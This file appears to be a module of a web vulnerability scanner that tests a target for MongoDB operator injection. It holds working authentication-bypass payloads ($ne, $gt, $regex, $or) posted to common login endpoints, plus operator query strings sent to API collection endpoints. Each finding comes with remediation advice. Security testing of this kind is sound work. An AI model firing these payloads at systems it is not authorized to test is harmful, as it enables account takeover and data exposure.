import { ts } from '../../context';
import { probe } from '../../utils/http';
import type { RealFinding, Target, LogFn } from '../../context';

export async function checkNoSqlInjection(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing NoSQL injection (JSON, form-encoded, URL params)...`);

  const baseline = await probe(target.url, { timeoutMs: 8_000 });

  const authEndpoints = [
    `${target.url.replace(/\/$/, '')}/api/login`,
    `${target.url.replace(/\/$/, '')}/login`,
    `${target.url.replace(/\/$/, '')}/auth`,
    `${target.url.replace(/\/$/, '')}/auth/login`,
    `${target.url.replace(/\/$/, '')}/api/auth/login`,
    `${target.url.replace(/\/$/, '')}/api/v1/login`,
    `${target.url.replace(/\/$/, '')}/signin`,
  ];

  const successSignals = ['welcome', 'dashboard', 'logged in', 'token', 'access_token', 'session', '"user":', '"id":', '"role":', 'authenticated'];

  for (const ep of authEndpoints) {
    // JSON operator injection
    const jsonPayloads = [
      JSON.stringify({ username: { $gt: '' }, password: { $gt: '' } }),
      JSON.stringify({ username: { $ne: null }, password: { $ne: null } }),
      JSON.stringify({ $or: [{ username: 'admin' }, { username: { $exists: true } }], password: { $gt: '' } }),
    ];
    for (const payload of jsonPayloads) {
      const r = await probe(ep, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, timeoutMs: 8_000 });
      if (!r) continue;
      const isSuccess = successSignals.some((s) => r.body.toLowerCase().includes(s));
      if (r.status === 200 && isSuccess) {
        const bl = baseline?.status ?? 0;
        if (bl !== 200 || Math.abs(r.body.length - (baseline?.body.length ?? 0)) > 80) {
          findings.push({
            title: 'NoSQL Injection — MongoDB Operator Auth Bypass (JSON)',
            severity: 'critical',
            verification: 'verified',
            confidence: 92,
            cvss: 9.8,
            cve: null,
            description: `MongoDB operator injection at ${ep} returned success response.`,
            evidence: `POST ${ep}\nPayload: ${payload}\nHTTP ${r.status} — success signal in response\nExcerpt: ${r.body.slice(0, 300)}`,
            remediation: 'Strip $ operators from user input. Use parameterised queries.',
          });
          await onLog(`[${ts()}] ⚠ NOSQL INJECTION CONFIRMED (JSON) at ${ep}`);
          return findings;
        }
      }
    }

    // Form-encoded operator injection
    const formPayloads = [
      'username[$gt]=&password[$gt]=',
      'username[$ne]=nonexistent&password[$ne]=nonexistent',
      'username[$regex]=.*&password[$regex]=.*',
    ];
    for (const payload of formPayloads) {
      const r = await probe(ep, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: payload, timeoutMs: 8_000 });
      if (!r) continue;
      const isSuccess = successSignals.some((s) => r.body.toLowerCase().includes(s));
      if (r.status === 200 && isSuccess) {
        findings.push({
          title: 'NoSQL Injection — MongoDB Operator Auth Bypass (Form-Encoded)',
          severity: 'critical',
          verification: 'suspected',
          confidence: 80,
          cvss: 9.8,
          cve: null,
          description: `Form-encoded MongoDB operator injection at ${ep} returned success.`,
          evidence: `POST ${ep}\nPayload: ${payload}\nHTTP ${r.status} — success signal in response`,
          remediation: 'Reject [] operator syntax in form inputs. Sanitise all inputs.',
        });
        await onLog(`[${ts()}] ⚠ NOSQL INJECTION (form-encoded) at ${ep}`);
        return findings;
      }
    }
  }

  // URL parameter injection on collection endpoints
  const collectionEndpoints = [
    `${target.url.replace(/\/$/, '')}/api/users`,
    `${target.url.replace(/\/$/, '')}/api/items`,
    `${target.url.replace(/\/$/, '')}/api/products`,
    `${target.url.replace(/\/$/, '')}/api/orders`,
  ];
  const urlOperators = [
    'filter[$where]=1==1',
    'q[$gt]=',
    'search[$regex]=.*',
  ];
  for (const ep of collectionEndpoints) {
    for (const qs of urlOperators) {
      const r = await probe(`${ep}?${qs}`, { timeoutMs: 8_000 });
      if (r && r.status === 200 && r.body.includes('[') && r.body.length > 100) {
        const blR = await probe(ep, { timeoutMs: 8_000 });
        if (blR && Math.abs(r.body.length - blR.body.length) > 50 && (blR.status !== 200 || blR.body.length < 10)) {
          findings.push({
            title: 'NoSQL Injection — URL Parameter Operator Injection',
            severity: 'high',
            verification: 'suspected',
            confidence: 68,
            cvss: 8.1,
            cve: null,
            description: `URL parameter operator injection at ${ep} returned a data-rich response when baseline returned nothing.`,
            evidence: `GET ${ep}?${qs} → HTTP ${r.status} (${r.body.length}b)\nBaseline: ${blR.status} (${blR.body.length}b)`,
            remediation: 'Validate query parameter keys; reject MongoDB operators.',
          });
          await onLog(`[${ts()}] ⚠ NOSQL URL PARAM INJECTION at ${ep}`);
          break;
        }
      }
    }
  }

  if (findings.length === 0) await onLog(`[${ts()}] No NoSQL injection indicators found`);
  return findings;
}
